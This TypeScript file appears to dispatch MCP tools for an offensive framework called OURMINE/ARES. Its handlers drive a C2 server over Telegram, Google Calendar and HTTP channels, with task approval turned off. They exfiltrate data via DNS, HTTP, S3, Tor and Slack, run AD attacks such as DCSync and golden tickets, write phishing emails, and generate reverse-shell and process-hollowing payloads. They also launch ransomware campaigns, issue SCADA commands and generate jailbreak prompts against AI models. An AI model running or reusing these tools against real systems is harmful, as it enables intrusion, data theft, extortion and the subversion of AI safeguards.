/**
 * MCP tool dispatch — all handlers delegate to real module functions (no stub findings).
 */
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"
import * as security from "./index.ts"
import { moduleEnvelope } from "./module_helpers.ts"
import { resolveDryRun } from "./exec_options.ts"
import {
  LegitC2Server,
  InMemoryTransport,
  HttpServiceTransport,
  TelegramTransport,
  GoogleCalendarTransport,
} from "./c2_platform.ts"
import { applyChannelRotation } from "./c2_rotation.ts"

type LiveOpts = { live?: boolean; dryRun?: boolean }

let mcpC2Server: LegitC2Server | undefined

function getMcpC2Server(): LegitC2Server {
  if (!mcpC2Server) {
    mcpC2Server = new LegitC2Server({
      checkpointPath: path.join(process.cwd(), ".ourmine", "c2", "mcp_checkpoint.jsonl"),
    })
  }
  return mcpC2Server
}

/** Test hook — inject a LegitC2Server instance for hermetic C2 dispatch tests. */
export function setMcpC2ServerForTest(server?: LegitC2Server): void {
  mcpC2Server = server
}

function buildC2Channels(live: boolean): import("./c2_rotation.ts").C2ChannelOption[] {
  const channels: import("./c2_rotation.ts").C2ChannelOption[] = [
    { name: "in-memory", transport: new InMemoryTransport(), priority: 10, edrRisk: "low" },
  ]
  const httpUrl = process.env.OURMINE_C2_HTTP_URL ?? process.env.C2_WEBHOOK_URL ?? ""
  if (httpUrl) {
    channels.push({
      name: "http",
      transport: new HttpServiceTransport({ url: httpUrl, live }),
      priority: 7,
      edrRisk: "medium",
    })
  }
  const tgToken = process.env.OURMINE_C2_TELEGRAM_TOKEN ?? process.env.TELEGRAM_BOT_TOKEN ?? ""
  const tgChat = process.env.OURMINE_C2_TELEGRAM_CHAT ?? process.env.TELEGRAM_CHAT_ID ?? ""
  if (tgToken && tgChat) {
    channels.push({
      name: "telegram",
      transport: new TelegramTransport({ botToken: tgToken, chatId: tgChat, live }),
      priority: 8,
      edrRisk: "low",
    })
  }
  const gcalToken = process.env.OURMINE_C2_GCAL_TOKEN ?? ""
  if (gcalToken) {
    channels.push({
      name: "graph",
      transport: new GoogleCalendarTransport({ token: gcalToken, live }),
      priority: 6,
      edrRisk: "low",
    })
  }
  return channels
}

function resolveTransport(channel: string, live: boolean, endpoint?: string): import("./c2_platform.ts").ServiceTransport {
  switch (channel) {
    case "telegram":
      return new TelegramTransport({
        botToken: process.env.OURMINE_C2_TELEGRAM_TOKEN ?? process.env.TELEGRAM_BOT_TOKEN ?? "",
        chatId: process.env.OURMINE_C2_TELEGRAM_CHAT ?? process.env.TELEGRAM_CHAT_ID ?? "",
        live,
      })
    case "graph":
      return new GoogleCalendarTransport({
        token: process.env.OURMINE_C2_GCAL_TOKEN ?? "",
        calendarId: process.env.OURMINE_C2_GCAL_ID ?? "primary",
        live,
      })
    case "http":
    case "https":
    default:
      return new HttpServiceTransport({
        url: endpoint ?? process.env.OURMINE_C2_HTTP_URL ?? process.env.C2_WEBHOOK_URL ?? "",
        live,
      })
  }
}

function resolveExfilPayload(data: string): { filePath: string; cleanup: boolean; bytes: number } {
  if (fs.existsSync(data) && fs.statSync(data).isFile()) {
    return { filePath: data, cleanup: false, bytes: fs.statSync(data).size }
  }
  const tmp = path.join(os.tmpdir(), `ourmine_exfil_${Date.now()}.bin`)
  fs.writeFileSync(tmp, data, "utf8")
  return { filePath: tmp, cleanup: true, bytes: Buffer.byteLength(data, "utf8") }
}

export async function adExploitExecute(
  req: { domain: string; technique: string; target?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const base = { dryRun, domain: req.domain }
  const mod = security.ad_exploit
  switch (req.technique) {
    case "dcsync":
      return mod.dcSync(req.target ?? "Administrator", base)
    case "pass_the_hash":
      return mod.passTheHash("whoami", { ...base, ntHash: "aad3b435b51404eeaad3b435b51404ee" })
    case "golden_ticket":
      return mod.forgeGoldenTicket("Administrator", "S-1-5-21-0000000000-0000000000-0000000000", "aad3b435b51404eeaad3b435b51404ee", base)
    case "silver_ticket":
      return mod.forgeSilverTicket("Administrator", "S-1-5-21-0000000000-0000000000-0000000000", "", req.target ?? "HTTP/web", base)
    case "acl_abuse":
      return mod.enumeratePrivilegedUsers(base)
    default:
      throw new Error(`[ARES] Unknown AD exploit technique: ${req.technique}`)
  }
}

export async function c2Execute(
  req: { action: string; channel?: string; payload?: string; beaconId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const live = !dryRun
  const server = getMcpC2Server()
  const action = req.action

  if (action === "status") {
    return moduleEnvelope(dryRun, {
      action,
      status: server.status(),
      probe: server.probe(),
    })
  }

  if (action === "list_beacons") {
    const beacons = server.sessionsList()
    return moduleEnvelope(dryRun, {
      action,
      beacons: beacons.length,
      status: beacons.length ? "active" : "no_active_beacons",
      agents: beacons,
    })
  }

  if (action === "send_task") {
    const payload = req.payload ?? ""
    let beaconId = req.beaconId
    let command = payload
    const colon = payload.indexOf(":")
    if (!beaconId && colon > 0) {
      beaconId = payload.slice(0, colon)
      command = payload.slice(colon + 1)
    }
    if (!beaconId) {
      const active = server.sessionsList().find((s) => s.status === "active")
      beaconId = active?.beacon_id
    }
    if (!beaconId) {
      return moduleEnvelope(dryRun, { action, error: "no active beacon — register beacon first" })
    }
    const queued = server.queueTask(beaconId, command, { requireApproval: false })
    let pumpResult: Record<string, unknown> | undefined
    if (live) {
      pumpResult = await server.pump()
    }
    return moduleEnvelope(dryRun, { action, beaconId, command, queued, pump: pumpResult })
  }

  if (action === "rotate_proxy") {
    const channels = buildC2Channels(live)
    const active = server.sessionsList().find((s) => s.status === "active")
    if (!active) {
      return moduleEnvelope(dryRun, { action, error: "no active beacon for channel rotation" })
    }
    const rotation = await applyChannelRotation(server, active.beacon_id, channels, { live })
    const selected = channels.find((c) => c.name === rotation.selectedChannel)
    if (selected && live) {
      server.attachTransport(active.beacon_id, selected.transport)
    }
    return moduleEnvelope(dryRun, { action, rotation, channel: rotation.selectedChannel })
  }

  if (action === "setup_channel") {
    const channel = req.channel ?? "https"
    const transport = resolveTransport(channel, live, req.payload)
    const active = server.sessionsList().find((s) => s.status === "active")
    if (active) {
      server.attachTransport(active.beacon_id, transport)
    }
    return moduleEnvelope(dryRun, {
      action,
      channel,
      transport: transport.name,
      probe: transport.probe(),
      attachedBeacon: active?.beacon_id,
    })
  }

  throw new Error(`[ARES] Unknown C2 action: ${action}`)
}

export async function strixExecute(
  req: { url: string; attack: string; payload?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const coord = new security.strix_engine.StrixCoordinator({ live: !dryRun })
  const typeMap: Record<string, "xss_reflection" | "csrf_test" | "sqli_probe" | "form_fuzz" | "auth_bypass"> = {
    xss_probe: "xss_reflection",
    csrf: "csrf_test",
    session_hijack: "form_fuzz",
    dom_clobbering: "form_fuzz",
    prototype_pollution: "sqli_probe",
    ssti: "sqli_probe",
  }
  coord.queue(req.url, typeMap[req.attack] ?? "form_fuzz")
  const jobs = await coord.runAll()
  const findings = jobs.map((j) =>
    security.module_helpers.realFinding(
      `strix-${j.type}`,
      `Strix ${j.type} on ${req.url}`,
      j.result ? "high" : "info",
      JSON.stringify(j.result ?? {}).slice(0, 500),
      "T1189",
    ),
  )
  return moduleEnvelope(dryRun, { jobs, payload: req.payload }, findings)
}

export async function vulnResearch(
  req: { query: string; limit?: number },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const kev = await security.vuln_research.checkCisaKev(req.query, !dryRun)
  return moduleEnvelope(dryRun, { query: req.query, limit: req.limit ?? 10, inKev: kev })
}

export async function autoResearch(
  req: { target: string; strategy?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if (req.strategy === "cve" || !req.strategy) {
    const result = await security.auto_research.researchCve({ cveId: req.target }, { dryRun })
    return moduleEnvelope(dryRun, result)
  }
  const intel = await security.intel_feeds.enrichTarget(req.target, { live: !dryRun })
  return moduleEnvelope(dryRun, { target: req.target, strategy: req.strategy, intel })
}

export async function hybridAdEntraExecute(
  req: { domain: string; tenantId?: string; technique?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const technique = req.technique ?? "ssso_token"
  if (technique === "phs_abuse") {
    const result = await security.hybrid_ad_entra.simulatePasswordHashSyncAbuse({ domain: req.domain, dryRun })
    return moduleEnvelope(dryRun, result)
  }
  if (technique === "ssso_token" || technique === "seamless_sso") {
    const result = await security.hybrid_ad_entra.simulateSeamlessSSOAbuse({ domain: req.domain, dryRun })
    return moduleEnvelope(dryRun, result)
  }
  const chain = await security.hybrid_ad_entra.hybridADAttackChain({ domain: req.domain, dryRun })
  return moduleEnvelope(dryRun, chain)
}

export async function oauthChainExecute(
  req: { target: string; technique: string; clientId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const audit = dryRun
    ? security.oauth_chain.auditOAuthChain(req.target, { dryRun, clientId: req.clientId })
    : await security.oauth_chain.auditOAuthChainAsync(req.target, { dryRun, clientId: req.clientId })
  return moduleEnvelope(dryRun, { ...audit, technique: req.technique, clientId: req.clientId })
}

export async function webmailExploitExecute(
  req: { target: string; technique: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const result = await security.webmail_exploit.simulateInboxRulePersistence(req.target, !dryRun)
  return moduleEnvelope(dryRun, { target: req.target, technique: req.technique, audit: result })
}

export async function exfiltrate(
  req: { data: string; channel?: string; endpoint?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const live = !dryRun
  const channel = req.channel ?? "dns"

  if (channel === "dns") {
    return security.exfil.exfiltrateDNS(req.data, { live, domain: req.endpoint || "exfil.lab.local" })
  }

  if (channel === "http") {
    const result = await security.exfil.exfiltrateHTTP(req.data, {
      live,
      url: req.endpoint,
    })
    return moduleEnvelope(dryRun, { channel, ...result })
  }

  const { filePath, cleanup, bytes } = resolveExfilPayload(req.data)
  try {
    if (channel === "s3") {
      const result = await security.raas_advanced.uploadToS3(filePath, { live, forceLive: live })
      return moduleEnvelope(dryRun, { channel, bytes, ...result })
    }

    if (channel === "tor") {
      const result = await security.raas_advanced.uploadViaTor(filePath, {
        live,
        forceLive: live,
        uploadUrl: req.endpoint,
      })
      return moduleEnvelope(dryRun, { channel, bytes, ...result })
    }

    if (channel === "slack") {
      const webhook = req.endpoint ?? process.env.SLACK_WEBHOOK_URL ?? process.env.OURMINE_SLACK_WEBHOOK ?? ""
      const result = await security.exfil_channels.sendSlackWebhook(req.data, webhook, live)
      return moduleEnvelope(dryRun, { channel, bytes, ...result })
    }

    if (channel === "icmp") {
      return moduleEnvelope(dryRun, {
        channel,
        bytes,
        error: "ICMP exfil requires raw socket privileges — use DNS or HTTP channel",
      })
    }

    return moduleEnvelope(dryRun, {
      channel,
      bytes,
      endpoint: req.endpoint,
      error: `Unsupported exfil channel: ${channel}`,
    })
  } finally {
    if (cleanup) {
      try { fs.unlinkSync(filePath) } catch { /* ignore */ }
    }
  }
}

export async function pivotTunnelExecute(
  req: { method: string; lhost?: string; lport?: number; rhost?: string; rport?: number },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const type = req.method === "chisel" ? "chisel" : req.method === "ssh" ? "port_forward" : "socks5"
  return security.pivot_tunnel.createPortForwarder(
    { type, localPort: req.lport ?? 1080, remoteHost: req.rhost ?? "127.0.0.1", remotePort: req.rport ?? 22 },
    !dryRun,
  )
}

export async function socialEngGenerate(
  req: { targetName: string; targetEmail?: string; targetCompany?: string; lure?: string; method?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const template = (["it_password_reset", "hr_benefits", "ceo_wire", "sharepoint_file", "mfa_verify"].includes(req.lure ?? "")
    ? req.lure : "it_password_reset") as "it_password_reset" | "hr_benefits" | "ceo_wire" | "sharepoint_file" | "mfa_verify"
  const email = security.social_eng.generatePhishingEmail(template, {
    dryRun, targetCompany: req.targetCompany, targetName: req.targetName, targetEmail: req.targetEmail,
  })
  return moduleEnvelope(dryRun, { email, method: req.method ?? "email" })
}

export async function toolkitGeneratePayload(
  req: { type: string; language?: string; lhost?: string; lport?: number; encode?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const { PayloadGenerator } = await import("./toolkit.ts")
  const gen = new PayloadGenerator(req.lhost ?? "127.0.0.1", req.lport ?? 4444)
  const type = req.type as import("./toolkit.ts").PayloadType
  const language = (req.language ?? "bash") as import("./toolkit.ts").PayloadLanguage
  const payload = gen.generate(type, language)
  const encoded =
    req.encode && req.encode !== "none"
      ? gen.encode(payload, req.encode as "base64" | "hex" | "url")
      : undefined
  return moduleEnvelope(dryRun, { type, language, payload, encoded })
}

export async function malwareDevExecute(
  req: { technique: string; targetProcess?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const stub = security.malware_dev.generateProcessHollowingStub(req.targetProcess ?? "explorer.exe")
  return moduleEnvelope(dryRun, { technique: req.technique, stubLength: stub.length })
}

export async function iotScadaExecute(
  req: { host: string; protocol?: string; action?: string; port?: number; unitId?: number; address?: number; quantity?: number; value?: number | boolean },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const result = await security.iot_scada.executeScadaAction(
    {
      host: req.host,
      protocol: req.protocol,
      action: req.action,
      port: req.port,
      unitId: req.unitId,
      address: req.address,
      quantity: req.quantity,
      value: req.value,
    },
    { dryRun, live: !dryRun },
  )
  return moduleEnvelope(dryRun, result)
}

export async function mobileExecute(
  req: { action: string; target?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const devices = security.mobile.listADBDevices(!dryRun)
  return moduleEnvelope(dryRun, { ...req, devices })
}

export async function firmwareAnalyze(
  req: { path: string; action?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const { executeFirmwareAction } = await import("./firmware.ts")
  const action = req.action ?? "extract"
  const result = executeFirmwareAction(req.path ?? "", action, { live: !dryRun })
  if (result.error) {
    return moduleEnvelope(dryRun, { path: req.path, action, ...result })
  }
  return moduleEnvelope(dryRun, { path: req.path, ...result })
}

export async function calderaTtpExecute(
  req: { techniqueId: string; profile?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const ability = {
    ability_id: req.techniqueId,
    name: req.techniqueId,
    description: `TTP ${req.techniqueId}`,
    tactic: "execution",
    technique_id: req.techniqueId,
    technique_name: req.techniqueId,
    executors: [{ name: "sh", platform: "linux", command: "id", cleanup: [], parsers: [], timeout: 30, payloads: [], uploads: [] }],
    requirements: [],
    privilege: "user",
    repeatable: true,
    buckets: [],
  }
  const result = await security.caldera_ttp.executeAbility(ability, { live: !dryRun })
  return moduleEnvelope(dryRun, result)
}

export async function atlasArsenalExecute(
  req: { attack: string; modelUrl?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const prompts = await security.atlas_arsenal.generateJailbreakPrompts(req.modelUrl, dryRun)
  return moduleEnvelope(dryRun, { attack: req.attack, prompts })
}

export async function devTargetExecute(
  req: { target: string; technique: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const secrets = security.dev_target.auditLocalDevEnvironment()
  return moduleEnvelope(dryRun, { ...req, secrets })
}

export async function supplyChainExecute(
  req: { package: string; ecosystem?: string; mode?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return security.supply_chain.analyze(
    { package: req.package, ecosystem: (req.ecosystem ?? "npm") as "npm" | "pypi", mode: (req.mode ?? "detect") as "detect" | "audit" },
    { live: !dryRun },
  )
}

export async function campaignExecute(
  req: { target: string; objective?: string; phases?: string[]; profileId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if (dryRun) {
    const campaign = new security.campaign.RedTeamCampaign(
      req.profileId ?? "intel_campaign",
      req.target,
      { objective: req.objective, profileId: req.profileId },
    )
    return moduleEnvelope(true, { plan: campaign.getSummary(), executed: false })
  }
  const result = await security.campaign.runCampaign(req.target, {
    objective: req.objective,
    profileId: req.profileId,
    live: true,
    maxStepsPerPhase: 5,
  })
  return moduleEnvelope(false, result)
}

export async function raasCampaignExecute(
  req: {
    targetDir: string
    esxiHost?: string
    smbTargets?: string[]
    domain?: string
    forceLive?: boolean
    family?: string
  },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const forceLive = req.forceLive === true || process.argv.includes("--force-live")
  const report = await security.raas_engine.runRaasCampaign({
    targetDir: req.targetDir,
    live: !dryRun,
    forceLive,
    esxiHost: req.esxiHost,
    smbTargets: req.smbTargets,
    domain: req.domain,
    familyName: req.family ?? "OURMINE-RAAS",
  })
  return moduleEnvelope(dryRun || report.dryRun, report)
}

export async function campaignPlan(
  req: { target: string; objective?: string; phases?: string[]; profileId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const campaign = new security.campaign.RedTeamCampaign(
    req.profileId ?? "intel_campaign",
    req.target,
    { objective: req.objective, profileId: req.profileId },
  )
  return moduleEnvelope(dryRun, campaign.getSummary())
}

export async function deviceCodeAuditExecute(
  req: { domain: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return security.device_code_phish.auditDeviceCodeFlow(req.domain, { dryRun })
}

export async function lateralPathfindingExecute(
  req: { source?: string; target: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const cg = security.credential_graph.CredentialGraph.load()
  const engine = new security.ares.LateralMovementEngine(cg)
  const path = engine.findPath(req.source ?? "local", req.target)
  return moduleEnvelope(dryRun, { path, source: req.source ?? "local", target: req.target })
}

export async function selfHealingCheckExecute(
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const engine = new security.ares.SelfHealingEngine(new security.covert_c2.CovertC2Engine())
  const lost = engine.findLostAgents()
  return moduleEnvelope(dryRun, { lostCount: lost.length, lostAgents: lost })
}

export async function techniqueDiscoveryExecute(
  req: { finding: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const yara = new security.yara.YaraEngine()
  const matches = yara.scanText(req.finding)
  return moduleEnvelope(dryRun, { matches, finding: req.finding })
}
